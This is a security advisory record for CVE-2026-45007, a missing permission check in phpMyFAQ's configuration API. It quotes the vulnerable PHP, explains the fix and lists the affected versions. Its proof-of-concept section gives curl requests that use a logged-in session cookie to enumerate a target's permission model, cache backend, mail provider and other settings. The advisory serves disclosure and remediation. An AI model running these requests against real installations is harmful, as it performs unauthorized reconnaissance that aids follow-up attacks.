@@ -1,0 +1,531 @@
+advisory_id: GHSA-rm98-82fr-mcfx
+datasource_id: github_osv/GHSA-rm98-82fr-mcfx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rm98-82fr-mcfx/GHSA-rm98-82fr-mcfx.json
+aliases:
+  - CVE-2026-45007
+summary: |
+  phpMyFAQ's Missing CONFIGURATION_EDIT Permission Check on 12 Admin API Configuration Tab Endpoints Allows Information Disclosure by Any Authenticated User
+  ## Summary
+
+  12 endpoints in `ConfigurationTabController.php` use `userIsAuthenticated()` (login-only check) instead of `userHasPermission(PermissionType::CONFIGURATION_EDIT)`. This allows any authenticated user — including ones with zero admin permissions — to enumerate system configuration metadata including the permission model, active template, cache backend, mail provider, and translation provider.
+
+  ## Details
+
+  The `ConfigurationTabController` contains 15 public endpoints. Three of them (`list`, `save`, `uploadTheme`) correctly enforce `CONFIGURATION_EDIT` permission:
+
+  ```php
+  // phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/ConfigurationTabController.php:63
+  public function list(Request $request): Response
+  {
+      $this->userHasPermission(PermissionType::CONFIGURATION_EDIT); // ✅ Correct
+      // ...
+  }
+  ```
+
+  The remaining 12 only check that the user is logged in:
+
+  ```php
+  // phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/ConfigurationTabController.php:353
+  public function translations(): Response
+  {
+      $this->userIsAuthenticated(); // ❌ Missing permission check
+      // ...
+  }
+  ```
+
+  The difference between these two methods is significant:
+
+  ```php
+  // AbstractController.php:258 — login-only
+  protected function userIsAuthenticated(): void
+  {
+      if (!$this->currentUser->isLoggedIn()) {
+          throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
+      }
+  }
+
+  // AbstractController.php:317 — login + permission check
+  protected function userHasPermission(PermissionType $permissionType): void
+  {
+      if (!$this->currentUser->isLoggedIn()) {
+          throw new UnauthorizedHttpException(challenge: 'User is not authenticated.');
+      }
+      $currentUser = $this->currentUser;
+      if (!$currentUser?->perm->hasPermission($currentUser->getUserId(), $permissionType->value)) {
+          throw new ForbiddenException(/* ... */);
+      }
+  }
+  ```
+
+  There is no middleware or router-level authorization — the Kernel (`Kernel.php`) dispatches directly to controllers with only Language, Router, and Exception listeners. All authorization is at the controller method level.
+
+  The 12 affected endpoints (all GET, all under `/admin/api/`):
+
+  | # | Method | Route | Info Exposed |
+  |---|--------|-------|-------------|
+  | 1 | `translations()` | `/configuration/translations` | Available languages + current language |
+  | 2 | `templates()` | `/configuration/templates` | Available themes + active theme |
+  | 3 | `faqsSortingKey()` | `/configuration/faqs-sorting-key/{current}` | FAQ sorting key options |
+  | 4 | `faqsSortingOrder()` | `/configuration/faqs-sorting-order/{current}` | FAQ sorting order |
+  | 5 | `faqsSortingPopular()` | `/configuration/faqs-sorting-popular/{current}` | Popular FAQ sorting |
+  | 6 | `permLevel()` | `/configuration/perm-level/{current}` | Permission model (basic/medium) |
+  | 7 | `releaseEnvironment()` | `/configuration/release-environment/{current}` | Dev/production environment |
+  | 8 | `searchRelevance()` | `/configuration/search-relevance/{current}` | Search relevance config |
+  | 9 | `seoMetaTags()` | `/configuration/seo-metatags/{current}` | SEO meta tag config |
+  | 10 | `translationProvider()` | `/configuration/translation-provider/{current}` | Translation service (DeepL, etc.) |
+  | 11 | `mailProvider()` | `/configuration/mail-provider/{current}` | Mail provider (SMTP, etc.) |
+  | 12 | `cacheAdapter()` | `/configuration/cache-adapter/{current}` | Cache backend (filesystem/redis/memcached) |
+
+  The `translations()` and `templates()` endpoints directly read from config/filesystem and expose current settings. The `{current}` endpoints render HTML `<option>` dropdowns where the caller-supplied value gets the `selected` attribute — an attacker can enumerate possible values to discover the current configuration.
+
+  ## PoC
+
+  ```bash
+  # Step 1: Authenticate as any user (even one with no admin permissions)
+  # and obtain the session cookie (pmf_auth_XXXX)
+
+  # Step 2: Query configuration endpoints that should require CONFIGURATION_EDIT permission
+
+  # Enumerate available languages and current language setting
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/translations
+
+  # Enumerate available templates and which is active
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/templates
+
+  # Discover permission model by trying known values
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/perm-level/basic
+
+  # Discover release environment
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/release-environment/development
+
+  # Discover cache backend
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/cache-adapter/filesystem
+
+  # Discover mail provider
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/mail-provider/smtp
+
+  # Discover translation provider
+  curl -s -b 'pmf_auth_XXXX=<session>' \
+    https://target.example/admin/api/configuration/translation-provider/deepl
+  ```
+
+  Expected: HTTP 403 Forbidden for a user without `configuration_edit` permission.
+  Actual: HTTP 200 with configuration data in HTML option format.
+
+  ## Impact
+
+  Any authenticated user (e.g., a regular FAQ contributor or a user with minimal permissions) can enumerate:
+
+  - The instance's permission model (basic vs. medium) — reveals access control architecture
+  - Whether the instance runs in development or production mode — development mode may expose debug info
+  - The cache backend (filesystem/redis/memcached) — useful for targeting cache-specific attacks
+  - The mail provider configuration — reveals infrastructure details
+  - Available and active templates/themes — aids in targeting template-specific vulnerabilities
+  - Translation provider (e.g., DeepL) — reveals third-party service integrations
+
+  While no credentials or secrets are directly exposed, this configuration metadata aids targeted follow-up attacks and violates the principle of least privilege — these endpoints exist to serve the admin configuration UI and should require the same `CONFIGURATION_EDIT` permission as the `list` and `save` endpoints.
+
+  ## Recommended Fix
+
+  Replace `$this->userIsAuthenticated()` with `$this->userHasPermission(PermissionType::CONFIGURATION_EDIT)` in all 12 affected methods:
+
+  ```php
+  // In ConfigurationTabController.php — apply to all 12 methods
+  // Before (line 355, and equivalent in all others):
+  $this->userIsAuthenticated();
+
+  // After:
+  $this->userHasPermission(PermissionType::CONFIGURATION_EDIT);
+  ```
+
+  Affected methods: `translations()`, `templates()`, `faqsSortingKey()`, `faqsSortingOrder()`, `faqsSortingPopular()`, `permLevel()`, `releaseEnvironment()`, `searchRelevance()`, `seoMetaTags()`, `translationProvider()`, `mailProvider()`, `cacheAdapter()`.
+impacted_packages:
+  - purl: pkg:composer/phpmyfaq/phpmyfaq
+    affected_versions: vers:composer/<=4.1.1
+    fixed_versions: vers:composer/4.1.2
+    affected_packages:
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-RC2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-RC3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-RC4
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-alpha2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-alpha3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-beta2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0-beta3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.0
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.1
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.4
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.5
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.6
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.7
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.8
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.9
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.10
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.11
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.12
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.13
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.14
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.15
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.16
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.17
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.18
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.19
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.20
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.21
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.22
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.23
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.24
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.25
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.26
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.27
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.28
+      - pkg:composer/phpmyfaq/phpmyfaq@2.8.29
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-alpha2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-alpha3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-alpha4
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-beta2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-rc
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-rc2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-rc3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0-rc4
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.0
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.1
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.2
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.3
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.4
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.5
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.6
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.7
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.8
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.9
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.10
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.11
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.12
+      - pkg:composer/phpmyfaq/phpmyfaq@2.9.13
+      - pkg:composer/phpmyfaq/phpmyfaq@2.10.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-RC.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-alpha.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-alpha.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-alpha.4
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-beta.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0-beta.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.0
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.1
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.4
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.5
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.6
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.7
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.8
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.9
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.10
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.11
+      - pkg:composer/phpmyfaq/phpmyfaq@3.0.12
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0-alpha.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0-alpha.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.0
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.1
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.4
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.5
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.6
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.7
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.8
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.9
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.10
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.11
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.12
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.13
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.14
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.15
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.16
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.17
+      - pkg:composer/phpmyfaq/phpmyfaq@3.1.18
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-RC.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-RC.4
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0-beta.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.0
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.1
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.2
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.3
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.4
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.5
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.6
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.7
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.8
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.9
+      - pkg:composer/phpmyfaq/phpmyfaq@3.2.10
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-RC.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-RC.3
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-RC.4
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-RC.5
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-alpha.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-alpha.3
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-alpha.4
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0-beta.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.0
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.1
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.3
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.4
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.5
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.6
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.7
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.8
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.9
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.10
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.11
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.12
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.13
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.14
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.15
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.16
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.18
+      - pkg:composer/phpmyfaq/phpmyfaq@4.0.19
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC.4
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC.5
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC.6
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-RC.7
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-alpha
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-alpha.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-alpha.3
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-beta
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0-beta.2
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.0
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.1
+    fixed_packages:
+      - pkg:composer/phpmyfaq/phpmyfaq@4.1.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:composer/thorsten/phpmyfaq
+    affected_versions: vers:composer/<=4.1.1
+    fixed_versions: vers:composer/4.1.2
+    affected_packages:
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-RC
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-RC2
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-RC3
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-RC4
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-alpha2
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-alpha3
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-beta
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-beta2
+      - pkg:composer/thorsten/phpmyfaq@2.8.0-beta3
+      - pkg:composer/thorsten/phpmyfaq@2.8.0
+      - pkg:composer/thorsten/phpmyfaq@2.8.1
+      - pkg:composer/thorsten/phpmyfaq@2.8.2
+      - pkg:composer/thorsten/phpmyfaq@2.8.3
+      - pkg:composer/thorsten/phpmyfaq@2.8.4
+      - pkg:composer/thorsten/phpmyfaq@2.8.5
+      - pkg:composer/thorsten/phpmyfaq@2.8.6
+      - pkg:composer/thorsten/phpmyfaq@2.8.7
+      - pkg:composer/thorsten/phpmyfaq@2.8.8
+      - pkg:composer/thorsten/phpmyfaq@2.8.9
+      - pkg:composer/thorsten/phpmyfaq@2.8.10
+      - pkg:composer/thorsten/phpmyfaq@2.8.11
+      - pkg:composer/thorsten/phpmyfaq@2.8.12
+      - pkg:composer/thorsten/phpmyfaq@2.8.13
+      - pkg:composer/thorsten/phpmyfaq@2.8.14
+      - pkg:composer/thorsten/phpmyfaq@2.8.15
+      - pkg:composer/thorsten/phpmyfaq@2.8.16
+      - pkg:composer/thorsten/phpmyfaq@2.8.17
+      - pkg:composer/thorsten/phpmyfaq@2.8.18
+      - pkg:composer/thorsten/phpmyfaq@2.8.19
+      - pkg:composer/thorsten/phpmyfaq@2.8.20
+      - pkg:composer/thorsten/phpmyfaq@2.8.21
+      - pkg:composer/thorsten/phpmyfaq@2.8.22
+      - pkg:composer/thorsten/phpmyfaq@2.8.23
+      - pkg:composer/thorsten/phpmyfaq@2.8.24
+      - pkg:composer/thorsten/phpmyfaq@2.8.25
+      - pkg:composer/thorsten/phpmyfaq@2.8.26
+      - pkg:composer/thorsten/phpmyfaq@2.8.27
+      - pkg:composer/thorsten/phpmyfaq@2.8.28
+      - pkg:composer/thorsten/phpmyfaq@2.8.29
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-alpha2
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-alpha3
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-alpha4
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-beta
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-beta2
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-rc
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-rc2
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-rc3
+      - pkg:composer/thorsten/phpmyfaq@2.9.0-rc4
+      - pkg:composer/thorsten/phpmyfaq@2.9.0
+      - pkg:composer/thorsten/phpmyfaq@2.9.1
+      - pkg:composer/thorsten/phpmyfaq@2.9.2
+      - pkg:composer/thorsten/phpmyfaq@2.9.3
+      - pkg:composer/thorsten/phpmyfaq@2.9.4
+      - pkg:composer/thorsten/phpmyfaq@2.9.5
+      - pkg:composer/thorsten/phpmyfaq@2.9.6
+      - pkg:composer/thorsten/phpmyfaq@2.9.7
+      - pkg:composer/thorsten/phpmyfaq@2.9.8
+      - pkg:composer/thorsten/phpmyfaq@2.9.9
+      - pkg:composer/thorsten/phpmyfaq@2.9.10
+      - pkg:composer/thorsten/phpmyfaq@2.9.11
+      - pkg:composer/thorsten/phpmyfaq@2.9.12
+      - pkg:composer/thorsten/phpmyfaq@2.9.13
+      - pkg:composer/thorsten/phpmyfaq@2.10.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-RC
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-RC.2
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-alpha.2
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-alpha.3
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-alpha.4
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-beta
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-beta.2
+      - pkg:composer/thorsten/phpmyfaq@3.0.0-beta.3
+      - pkg:composer/thorsten/phpmyfaq@3.0.0
+      - pkg:composer/thorsten/phpmyfaq@3.0.1
+      - pkg:composer/thorsten/phpmyfaq@3.0.2
+      - pkg:composer/thorsten/phpmyfaq@3.0.3
+      - pkg:composer/thorsten/phpmyfaq@3.0.4
+      - pkg:composer/thorsten/phpmyfaq@3.0.5
+      - pkg:composer/thorsten/phpmyfaq@3.0.6
+      - pkg:composer/thorsten/phpmyfaq@3.0.7
+      - pkg:composer/thorsten/phpmyfaq@3.0.8
+      - pkg:composer/thorsten/phpmyfaq@3.0.9
+      - pkg:composer/thorsten/phpmyfaq@3.0.10
+      - pkg:composer/thorsten/phpmyfaq@3.0.11
+      - pkg:composer/thorsten/phpmyfaq@3.0.12
+      - pkg:composer/thorsten/phpmyfaq@3.1.0-RC
+      - pkg:composer/thorsten/phpmyfaq@3.1.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@3.1.0-alpha.2
+      - pkg:composer/thorsten/phpmyfaq@3.1.0-alpha.3
+      - pkg:composer/thorsten/phpmyfaq@3.1.0-beta
+      - pkg:composer/thorsten/phpmyfaq@3.1.0
+      - pkg:composer/thorsten/phpmyfaq@3.1.1
+      - pkg:composer/thorsten/phpmyfaq@3.1.2
+      - pkg:composer/thorsten/phpmyfaq@3.1.3
+      - pkg:composer/thorsten/phpmyfaq@3.1.4
+      - pkg:composer/thorsten/phpmyfaq@3.1.5
+      - pkg:composer/thorsten/phpmyfaq@3.1.6
+      - pkg:composer/thorsten/phpmyfaq@3.1.7
+      - pkg:composer/thorsten/phpmyfaq@3.1.8
+      - pkg:composer/thorsten/phpmyfaq@3.1.9
+      - pkg:composer/thorsten/phpmyfaq@3.1.10
+      - pkg:composer/thorsten/phpmyfaq@3.1.11
+      - pkg:composer/thorsten/phpmyfaq@3.1.12
+      - pkg:composer/thorsten/phpmyfaq@3.1.13
+      - pkg:composer/thorsten/phpmyfaq@3.1.14
+      - pkg:composer/thorsten/phpmyfaq@3.1.15
+      - pkg:composer/thorsten/phpmyfaq@3.1.16
+      - pkg:composer/thorsten/phpmyfaq@3.1.17
+      - pkg:composer/thorsten/phpmyfaq@3.1.18
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-RC
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-RC.2
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-RC.4
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-beta
+      - pkg:composer/thorsten/phpmyfaq@3.2.0-beta.2
+      - pkg:composer/thorsten/phpmyfaq@3.2.0
+      - pkg:composer/thorsten/phpmyfaq@3.2.1
+      - pkg:composer/thorsten/phpmyfaq@3.2.2
+      - pkg:composer/thorsten/phpmyfaq@3.2.3
+      - pkg:composer/thorsten/phpmyfaq@3.2.4
+      - pkg:composer/thorsten/phpmyfaq@3.2.5
+      - pkg:composer/thorsten/phpmyfaq@3.2.6
+      - pkg:composer/thorsten/phpmyfaq@3.2.7
+      - pkg:composer/thorsten/phpmyfaq@3.2.8
+      - pkg:composer/thorsten/phpmyfaq@3.2.9
+      - pkg:composer/thorsten/phpmyfaq@3.2.10
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-RC
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-RC.2
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-RC.3
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-RC.4
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-RC.5
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-alpha.2
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-alpha.3
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-alpha.4
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-beta
+      - pkg:composer/thorsten/phpmyfaq@4.0.0-beta.2
+      - pkg:composer/thorsten/phpmyfaq@4.0.0
+      - pkg:composer/thorsten/phpmyfaq@4.0.1
+      - pkg:composer/thorsten/phpmyfaq@4.0.2
+      - pkg:composer/thorsten/phpmyfaq@4.0.3
+      - pkg:composer/thorsten/phpmyfaq@4.0.4
+      - pkg:composer/thorsten/phpmyfaq@4.0.5
+      - pkg:composer/thorsten/phpmyfaq@4.0.6
+      - pkg:composer/thorsten/phpmyfaq@4.0.7
+      - pkg:composer/thorsten/phpmyfaq@4.0.8
+      - pkg:composer/thorsten/phpmyfaq@4.0.9
+      - pkg:composer/thorsten/phpmyfaq@4.0.10
+      - pkg:composer/thorsten/phpmyfaq@4.0.11
+      - pkg:composer/thorsten/phpmyfaq@4.0.12
+      - pkg:composer/thorsten/phpmyfaq@4.0.13
+      - pkg:composer/thorsten/phpmyfaq@4.0.14
+      - pkg:composer/thorsten/phpmyfaq@4.0.15
+      - pkg:composer/thorsten/phpmyfaq@4.0.16
+      - pkg:composer/thorsten/phpmyfaq@4.0.18
+      - pkg:composer/thorsten/phpmyfaq@4.0.19
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC.2
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC.4
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC.5
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC.6
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-RC.7
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-alpha
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-alpha.2
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-alpha.3
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-beta
+      - pkg:composer/thorsten/phpmyfaq@4.1.0-beta.2
+      - pkg:composer/thorsten/phpmyfaq@4.1.0
+      - pkg:composer/thorsten/phpmyfaq@4.1.1
+    fixed_packages:
+      - pkg:composer/thorsten/phpmyfaq@4.1.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '4.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rm98-82fr-mcfx/GHSA-rm98-82fr-mcfx.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-862
+references:
+  - url: https://github.com/thorsten/phpMyFAQ
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-45007
+    reference_type:
+    reference_id:
+  - url: https://www.vulncheck.com/advisories/phpmyfaq-missing-permission-check-on-12-configuration-api-endpoints-allows-information-disclosure
+    reference_type:
+    reference_id:
+  - url: https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-rm98-82fr-mcfx
+    reference_type:
+    reference_id: GHSA-rm98-82fr-mcfx
+exploits: []
